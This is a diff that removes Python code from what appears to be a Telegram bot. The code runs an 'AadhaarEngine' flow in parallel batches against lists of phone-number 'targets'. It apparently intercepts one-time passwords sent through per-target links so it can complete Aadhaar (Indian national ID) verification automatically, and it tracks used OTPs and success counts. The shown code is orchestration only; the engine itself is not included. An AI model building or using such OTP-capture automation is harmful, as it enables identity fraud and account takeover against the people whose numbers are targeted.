-            auto_otp_state["used_otps"].add((url, key))
-        return otp
-
-
-async def run_parallel_batch(bot, chat_id, mobile_targets):
-    """Legacy /runall — keeps manual OTP fallback."""
-    if not mobile_targets:
-        bot.send_message(chat_id, "❌ No targets.", parse_mode='HTML')
-        return
-
-    batch_id = str(uuid.uuid4())[:8]
-    try:
-        stats_manager.record_parallel_batch(batch_id, chat_id, len(mobile_targets))
-    except: pass
-
-    targets_meta = []
-    for idx, tgt in enumerate(mobile_targets):
-        phone = tgt.get("phone") if isinstance(tgt, dict) else str(tgt)
-        url = tgt.get("url") if isinstance(tgt, dict) else None
-        cid = tgt.get("cid") if isinstance(tgt, dict) else None
-        targets_meta.append({"phone": phone, "url": url, "cid": cid, "index": idx})
-
-    lines = [f"🚀 <b>PARALLEL BATCH</b> ({batch_id})", "━━━━━━━━━━━━━━━━━━━━━━",
-             f"👥 Targets: <b>{len(targets_meta)}</b>"]
-    for i, t in enumerate(targets_meta, 1):
-        lines.append(f"  {i}. <code>{t['phone']}</code>")
-    lines.append("⏳ Launching (5 concurrent)...")
-    try:
-        bot.send_message(chat_id, "\n".join(lines), parse_mode='HTML')
-    except: pass
-
-    sem = asyncio.Semaphore(5)
-
-    async def _run_one(t):
-        async with sem:
-            phone, url, cid, idx = t["phone"], t["url"], t["cid"], t["index"]
-            engine = AadhaarEngine(bot, chat_id=chat_id)
-            engine._unique_suffix = f"_p{idx}"
-            orig_update = engine.update_status
-
-            def prefixed(text, _p=phone, _o=orig_update):
-                try: _o(f"📱 <b>[{_p}]</b>\n{text}")
-                except: pass
-
-            engine.update_status = prefixed
-
-            async def bound_otp(target_mobile, timeout=90):
-                if not url or not cid:
-                    return None
-                return await _wait_for_otp_on_link(url, cid, target_mobile, timeout=timeout)
-
-            engine._try_firebase_otp = bound_otp
-            engine._force_auto_otp = True
-            engine._bound_url = url
-            engine._bound_cid = cid
-
-            try:
-                await engine.run_flow(chat_id, "Mrs", phone, None, user_info=None)
-                return {"phone": phone, "status": "done"}
-            except Exception as e:
-                try:
-                    bot.send_message(chat_id,
-                        f"❌ <b>[{phone}] failed:</b>\n<code>{escape_html(str(e))[:300]}</code>",
-                        parse_mode='HTML')
-                except: pass
-                return {"phone": phone, "status": "failed"}
-            finally:
-                try: await engine.delete_temp_messages()
-                except: pass
-                try: await engine.close()
-                except: pass
-
-    results = await asyncio.gather(*[_run_one(t) for t in targets_meta], return_exceptions=True)
-    done = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "done")
-    failed = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "failed")
-
-    try:
-        stats_manager.update_parallel_batch_status(batch_id, done=done, failed=failed)
-    except: pass
-
-    try:
-        bot.send_message(chat_id,
-            f"🏁 <b>BATCH COMPLETE</b> ({batch_id})\n"
-            f"✅ {done}  ❌ {failed}  📊 {len(targets_meta)}",
-            parse_mode='HTML')
-    except: pass
-
-
-def start_parallel_batch(bot, chat_id, mobile_targets):
-    global _running_loop
-    if not _running_loop or not _running_loop.is_running():
-        return False
-    try:
-        asyncio.run_coroutine_threadsafe(run_parallel_batch(bot, chat_id, mobile_targets), _running_loop)
-        return True
-    except: return False
